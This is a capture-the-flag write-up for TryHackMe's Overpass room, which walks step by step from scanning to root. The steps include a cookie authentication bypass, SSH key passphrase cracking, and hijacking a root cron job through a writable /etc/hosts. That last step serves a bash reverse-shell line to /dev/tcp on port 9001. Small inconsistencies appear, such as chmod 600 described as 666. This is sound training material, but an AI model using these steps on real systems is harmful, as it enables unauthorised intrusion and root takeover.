---
Platform:
  - TryHackMe
Difficulty: Easy
Status: Rooted/Finished
Blog Posting: Not Posted
Type: Machine
---
In this writeup we are going to solve the Overpass room from TryHackMe.

Link to the Room : [https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)

  

Lets Start……

  

First start the machine and perform a basic nmap scan.

Command: `nmap -A -T4 -v <Target_IP>`

![[Overpass/assets/Untitled.png|Untitled.png]]

From the results of the nmap scan, we can find 2 ports that are open, one is port 22 and the other one is port 80. On port 22 ssh service is running and on port 80, a golang http server is running. Lets visit the website that is running on port 80.

![[Overpass/assets/Untitled 1.png|Untitled 1.png]]

There is nothing interesting on the website. Lets enumerate the directories in the web server to find hidden directories using gobuster.

Command: `gobuster dir -u http://<Target_ID>/ -w` `**/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt**`

![[Overpass/assets/Untitled 2.png|Untitled 2.png]]

From the results of the gobuster, we can see that there is a directory `/admin`.

The `/admin` path consists of a login page for the Administrator area.

![[Overpass/assets/Untitled 3.png|Untitled 3.png]]

I tried some default credentials like `admin:admin` but it didn’t work. Then I tried some basice sql injection but it also didn’t work. Then I checked the page source and found the `login.js` script.

![[Overpass/assets/Untitled 4.png|Untitled 4.png]]

In the `login.js` script, in the login function, if the login is successful, it sets a cookie named “SessionToken”.

![[Overpass/assets/Untitled 5.png|Untitled 5.png]]

So, I tried to manually set a cookie with the name of “SessionToken” and with a empty value “”.

To set the cookie, open the dev tools and go to the application tab, and go to the cookies section and double click the Name area to add a cookie and enter the name as `SessionToken` , leave the value as empty and set the Path to “/”.

![[Overpass/assets/Untitled 6.png|Untitled 6.png]]

Now refresh the page. We have successfully logged in.

![[Overpass/assets/Untitled 7.png|Untitled 7.png]]

The web application only checks whether there is cookie to access the admin page and it doesn’t verify or check whether the cookie is valid or not.

We can see SSH Key for the user `james` in the admin page and its also mentioned that if we crack this SSH key we can find the password for the user james. Now copy and save this Key in a file in your local machine.

![[Overpass/assets/Untitled 8.png|Untitled 8.png]]

I have saved the private key in a file named key. I changed the permission of the key file to `666` using the command `chmod 600 key` and I tried to login via SSH using this key, it’s prompting for a passphrase.

![[Overpass/assets/Untitled 9.png|Untitled 9.png]]

So, I tried to crack the key using [JohnTheRipper](https://www.openwall.com/john/). To do that so, first we have to convert the private key into a hash format. To do that we can use `ssh2john`.

![[Overpass/assets/Untitled 10.png|Untitled 10.png]]

I have generated the hash and stored in a file named `johnSSH`. Now we can use this hash to crack the passphrase using [JohnTheRipper](https://www.openwall.com/john/).

Command: `john --wordlist=/usr/share/wordlists/rockyou.txt johnSSH`

![[Overpass/assets/Untitled 11.png|Untitled 11.png]]

And we got the passphrase. Now we can login via SSH as the user `james` by using the private key and passphrase.

![[Overpass/assets/Untitled 12.png|Untitled 12.png]]

Now we have logged in as the user `james`. And you can get the user flag from user.txt.

![[Overpass/assets/Untitled 13.png|Untitled 13.png]]

Now to find the root flag we have to escalate our priveleges. For that we are going to use the [linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) tool. Download the [`linpeas.sh`](http://linpeas.sh) script in your local machine. Now go to the directory where your downloaded [`linpeas.sh`](http://linpeas.sh) file is and open the directory location in a terminal.

Now we can use python to start a simple http server to host the [`linpeas.sh`](http://linpeas.sh) file and we can download this file from the ssh session of the user james as tryhackme rooms don’t have internet access. To start a simple http server use the following command:

`python3 -m http.server`

![[Overpass/assets/Untitled 14.png|Untitled 14.png]]

Now in the ssh session of james, use wget to download the linpeas file using the following command: `wget http://<your_tryhackme_tun_IP>:8000/`[`linpeas.sh`](http://linpeas.sh). After downloading the file, update the linpeas.sh files permission to be a executable by using the following command: `chmod +x linpeas.sh`

![[Overpass/assets/Untitled 15.png|Untitled 15.png]]

Now run the linpeas.sh file and wait for its response.

![[Overpass/assets/Untitled 16.png|Untitled 16.png]]

Under the `cron jobs` section of the response, we can see that there is a curl command which is executed with root permissions.

![[Overpass/assets/Untitled 17.png|Untitled 17.png]]

The curl command is executing a file named `buildscript.sh` which has a file path `/downloads/src/buildscript.sh` which is hosted in the `overpass.thm` address.

We can check the `/etc/hosts` file to find out which IP address/domain the `overpass.thm` address resolves to.

![[Overpass/assets/Untitled 18.png|Untitled 18.png]]

We can see that the `overpass.thm` resolves to localhost i.e, `127.0.0.1`.

And also under the `Interesting writable files` section of the `linpeas` response, we can see that we have write access to the `/etc/hosts` file

![[Overpass/assets/Untitled 19.png|Untitled 19.png]]

So, we can modify the `/etc/hosts` file i.e., we can change the resolving IP address of the `overpass.thm` from `127.0.0.1` to our self hosted server and we can make it to execute our custom made `buildscript.sh` file in our local machine which on executed will obtain a reverse shell.

To do that we have to create directory structure in our local machine, like the directory structure in the curl command i.e., `/downloads/src/buildscript.sh`.

![[Overpass/assets/Untitled 20.png|Untitled 20.png]]

Now in the `src` directory, create a [`buildscript.sh`](http://buildscript.sh) file which on executed will obtain a reverse shell. The `buildscript.sh` file contains the following python script:

```
/bin/bash -i >& /dev/tcp/<your_tryhackme_tun_IP>/9001 0>&1
```

![[Overpass/assets/Untitled 21.png|Untitled 21.png]]

Now go to the root directory for our web server, in my case it is the `~Desktop/Overpass` directory and execute the following command : `python3 -m http.server 80`

![[Overpass/assets/Untitled 22.png|Untitled 22.png]]

And also open another terminal and create a `netcat` listener on port `9001` using the following command : `nc -lvnp 9001`

![[Overpass/assets/Untitled 23.png|Untitled 23.png]]

Now in the `james` SSH session open the `/etc/hosts` with your favourite text editor and edit the IP address of the `overpass.thm` from `127.0.0.1` to `<your_tryhackme_tun_IP>`.

![[Overpass/assets/Untitled 24.png|Untitled 24.png]]

Now wait for some time (around 20 to 30 secs). You will get a reverse shell back, check the `netcat` listener that you have created…..

![[Overpass/assets/Untitled 25.png|Untitled 25.png]]

Successfully got the root flag…..

  

Thankyou…….